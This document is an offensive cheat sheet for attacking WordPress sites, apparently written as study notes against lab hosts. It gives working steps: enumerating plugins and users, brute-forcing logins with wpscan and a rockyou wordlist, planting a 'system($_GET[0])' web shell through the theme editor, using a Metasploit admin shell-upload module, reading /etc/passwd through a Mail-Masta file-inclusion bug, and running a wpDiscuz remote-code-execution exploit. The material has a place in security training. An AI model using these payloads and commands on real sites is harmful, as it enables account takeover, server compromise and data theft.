# WordPress

## **Introduction**

> * WordPress is extremely prevalent on the internet and presents a vast attack surface
> * Getting access to an administrator is usually sufficient to obtain code execution on the server.
> * Editors and authors might have access to certain vulnerable plugins, which normal users don’t.

***

## **Wordpress User Roles**

| User Role     | Description                                                                                                                 |
| ------------- | --------------------------------------------------------------------------------------------------------------------------- |
| Administrator | Full Privileges - This user role is an interesting target due to his capability of managing plugins                         |
| Editor        | Can publish and manage any user's posts - This user role is an interesting target due to his capability of managing plugins |
| Author        | Can publish and manage their posts                                                                                          |
| Contributor   | Can write and manage their own post, but he cannot publish them                                                             |
| Subscriber    | Can view posts and manage/modify their profile                                                                              |

***

## **WordPress Discovery/Footprinting**

| Command                                                        | Description                                                                               |
| -------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| Browse to `http://blog.inlanefreight.local/robots.txt`         | Check if `robots.txt` contains any wp-entry (e.g. `wp-admin`, `wp-content`, `wp-sitemap`) |
| Browse to `http://blog.inlanefreight.local/wp-admin`           | Check if `wp-admin` exists                                                                |
| Browse to `http://blog.inlanefreight.local/wp-content`         | Check if `wp-content` exists                                                              |
| Browse to `http://blog.inlanefreight.local/wp-content/plugins` | Enumerate and look for vulnerable plugins                                                 |
| Browse to `http://blog.inlanefreight.local/wp-content/themes`  | Enumerate and look for vulnerable themes                                                  |
| `curl -s http://blog.inlanefreight.local \| grep WordPress`    | Check webpage source                                                                      |
| `curl -s http://blog.inlanefreight.local \| grep themes`       | Check webpage source                                                                      |
| `curl -s http://blog.inlanefreight.local \| grep plugins`      | Check webpage source                                                                      |

***

## **WpScan Basic Commands**

| Command                                                                                                                       | Description                                                 |
| ----------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| `wpscan --url test.example --api-token TOKENVALUE --output wpscan-ir-host`                                                    | Run wpscan using an api token                               |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Run wpscan and perform a password attack against the target |

***

## **Wordpress User Enumeration and Login Bruteforcing**

* **Login Form - Usernames Enumeration**: in some versions of wordpress it's possible to enumerate usernames due to wordpress error messages giving too many information: whenever a username is right, the web application may show a message such as `"the password is not valid"`, meaning that the username is valid.
* **Login Form - Password Bruteforcing**: wpscan can be used to bruteforce a valid user's password:\
  `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local`

***

## **Admin User - Remote Code Execution**

> An aministrator account may edit PHP code in order to gain RCE

**The steps are the following:**

* **Semi-automatically, using `msfconsole`:** `use exploit/unix/webapp/wp_admin_shell_upload`
* **Manually, by modifying a theme:**
  1. Login as administrator → Navigate to: appearance → side panel → theme editor → select a theme
  2. Add the following to the theme: `system($_GET[0]);`
  3. Use the following URL to gain RCE: `http://example.test/wp-content/themes/THEMENAME/FILEPHPNAME.PHP?0=id`

***

## **WordPress Known Vulnerable Plugins**

1. **`Mail-Masta` allows LFI by using the following PoC:** `curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
2. `wpDiscuz` allows RCE by using the following PoC:
   * [ExploitDB](https://www.exploit-db.com/exploits/49967): `python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`
   * if it fails, use `cURL` to execute commands using the uploaded web shell: `curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id`
